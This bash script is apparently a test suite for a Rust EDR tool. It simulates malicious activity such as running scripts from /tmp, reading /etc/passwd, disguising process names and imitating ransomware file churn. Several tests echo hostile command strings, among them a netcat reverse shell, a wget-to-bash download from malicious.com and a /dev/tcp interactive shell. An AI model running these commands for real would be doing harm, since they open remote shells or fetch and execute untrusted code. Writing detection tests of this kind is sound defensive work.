#!/bin/bash
# EDR Test Suite - Malicious Behavior Simulator
# This script simulates various malicious activities to test EDR detection

echo "🧪 Rust EDR Test Suite - Malicious Behavior Simulator"
echo "=================================================="
echo ""
echo "⚠️  WARNING: This script simulates malicious behavior"
echo "    Only run in a controlled environment (VM recommended)"
echo ""
read -p "Press Enter to continue or Ctrl+C to cancel..."
echo ""

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

test_count=0
success_count=0

run_test() {
    local test_name=$1
    local test_description=$2
    
    test_count=$((test_count + 1))
    echo -e "${YELLOW}Test $test_count: $test_name${NC}"
    echo "Description: $test_description"
    echo "---"
}

wait_for_detection() {
    echo "⏱️  Waiting 3 seconds for EDR detection..."
    sleep 3
    echo ""
}

# Test 1: Suspicious Process Location
run_test "Suspicious Process Location" "Execute script from /tmp directory"
cat > /tmp/suspicious_process.sh << 'EOF'
#!/bin/bash
echo "I'm running from /tmp - this should trigger HIGH alert!"
sleep 1
EOF
chmod +x /tmp/suspicious_process.sh
/tmp/suspicious_process.sh
wait_for_detection

# Test 2: Suspicious Process Location - /dev/shm
run_test "Suspicious Process Location - Shared Memory" "Execute script from /dev/shm"
cat > /dev/shm/shm_malware.sh << 'EOF'
#!/bin/bash
echo "Running from shared memory - CRITICAL alert expected!"
sleep 1
EOF
chmod +x /dev/shm/shm_malware.sh
/dev/shm/shm_malware.sh 2>/dev/null || echo "Failed to execute (may need permissions)"
wait_for_detection

# Test 3: Reverse Shell Simulation (command line only, won't actually connect)
run_test "Suspicious Command Pattern - Reverse Shell" "Simulated reverse shell command"
bash -c 'echo "nc -e /bin/bash 192.168.1.100 4444" # Simulated, not executed' &
wait_for_detection

# Test 4: Download and Execute Pattern
run_test "Suspicious Command Pattern - Download & Execute" "wget piped to bash"
bash -c 'echo "wget http://malicious.com/script.sh | bash" # Simulated' &
wait_for_detection

# Test 5: /dev/tcp Usage (common in reverse shells)
run_test "Suspicious Command Pattern - /dev/tcp" "Using /dev/tcp for connections"
bash -c 'echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" # Simulated' &
wait_for_detection

# Test 6: Critical File Access - /etc/passwd
run_test "Critical File Access" "Attempt to read /etc/passwd"
cat /etc/passwd > /dev/null
wait_for_detection

# Test 7: SSH Key Manipulation (safe simulation)
run_test "SSH Key Manipulation" "Create/modify SSH authorized_keys"
mkdir -p ~/.ssh 2>/dev/null
touch ~/.ssh/test_authorized_keys
echo "# Test key" >> ~/.ssh/test_authorized_keys
rm ~/.ssh/test_authorized_keys
wait_for_detection

# Test 8: Privilege Escalation - sudo usage
run_test "Privilege Escalation Detection" "Using sudo command"
echo "Attempting sudo (you may need to enter password):"
sudo whoami 2>/dev/null || echo "Sudo failed or not available"
wait_for_detection

# Test 9: Hidden File Execution
run_test "Hidden File Execution" "Execute hidden file (starts with .)"
cat > /tmp/.hidden_malware << 'EOF'
#!/bin/bash
echo "I'm a hidden executable!"
EOF
chmod +x /tmp/.hidden_malware
/tmp/.hidden_malware
wait_for_detection

# Test 10: Rapid File Modifications (Ransomware simulation)
run_test "Ransomware Behavior - Rapid File Modifications" "Create and modify 15 files quickly"
mkdir -p /tmp/ransomware_test
for i in {1..15}; do
    echo "Original content" > /tmp/ransomware_test/file_$i.txt
    echo "ENCRYPTED" > /tmp/ransomware_test/file_$i.txt
done
wait_for_detection

# Test 11: Mass File Deletion (Ransomware simulation)
run_test "Ransomware Behavior - Mass Deletion" "Delete multiple files quickly"
for i in {1..6}; do
    rm -f /tmp/ransomware_test/file_$i.txt 2>/dev/null
done
wait_for_detection

# Test 12: Suspicious Network Connection
run_test "Suspicious Port Connection" "Attempt connection to suspicious port"
timeout 1 bash -c 'cat < /dev/tcp/127.0.0.1/4444' 2>/dev/null || echo "Connection failed (expected)"
wait_for_detection

# Test 13: Port 31337 (elite/leet - common hacker port)
run_test "Connection to Hacker Port 31337" "Attempt connection to port 31337"
timeout 1 bash -c 'cat < /dev/tcp/127.0.0.1/31337' 2>/dev/null || echo "Connection failed (expected)"
wait_for_detection

# Test 14: Multiple Process Spawns
run_test "Rapid Process Spawning" "Spawn multiple child processes"
for i in {1..5}; do
    bash -c 'sleep 0.1' &
done
wait
wait_for_detection

# Test 15: Credential Dumping Simulation
run_test "Credential Dumping Pattern" "Simulate mimikatz-like behavior"
bash -c 'ps aux | grep -i "pass\|cred\|token" > /dev/null' &
wait_for_detection

# Test 16: File in /etc modification attempt
run_test "System File Modification Attempt" "Try to create file in /etc"
sudo touch /etc/edr_test_file 2>/dev/null && sudo rm /etc/edr_test_file 2>/dev/null || echo "No sudo access (expected in some cases)"
wait_for_detection

# Test 17: Kernel Module Check (Rootkit detection trigger)
run_test "Kernel Module Enumeration" "List kernel modules (rootkit behavior)"
lsmod > /dev/null
wait_for_detection

# Test 18: Process Hiding Attempt Simulation
run_test "Process Name Obfuscation" "Create process with suspicious name"
bash -c 'exec -a "[kworker/0:0]" sleep 2' &
HIDDEN_PID=$!
wait $HIDDEN_PID 2>/dev/null
wait_for_detection

# Test 19: Data Exfiltration Simulation
run_test "Data Exfiltration Pattern" "Read sensitive files + network activity"
cat /etc/passwd > /tmp/exfil_data.txt
timeout 1 bash -c 'cat < /dev/tcp/8.8.8.8/80' 2>/dev/null || echo "Connection attempt made"
rm -f /tmp/exfil_data.txt
wait_for_detection

# Test 20: Persistence Mechanism Simulation
run_test "Persistence Mechanism" "Create suspicious cron-like entry"
echo "# Simulated persistence" > /tmp/.persistence_test
rm -f /tmp/.persistence_test
wait_for_detection

# Cleanup
echo ""
echo "🧹 Cleaning up test artifacts..."
rm -f /tmp/suspicious_process.sh
rm -f /dev/shm/shm_malware.sh 2>/dev/null
rm -f /tmp/.hidden_malware
rm -rf /tmp/ransomware_test
rm -f /tmp/exfil_data.txt
rm -f /tmp/.persistence_test

echo ""
echo "=================================================="
echo "✅ Test suite completed!"
echo ""
echo "📊 Test Summary:"
echo "   Total tests run: $test_count"
echo ""
echo "📝 Next Steps:"
echo "   1. Check EDR logs: tail -f /var/log/rust-edr/threats_*.jsonl | jq ."
echo "   2. View recent alerts: sudo ./target/release/rust-edr alerts --recent 20"
echo "   3. Check event count: sudo ./target/release/rust-edr status"
echo ""
echo "⚠️  Expected detections:"
echo "   - Suspicious process locations (HIGH)"
echo "   - Critical file access (CRITICAL/HIGH)"
echo "   - Privilege escalation (HIGH)"
echo "   - Ransomware behavior (CRITICAL)"
echo "   - Suspicious command patterns (HIGH)"
echo "   - Network suspicious ports (MEDIUM/HIGH)"
echo ""
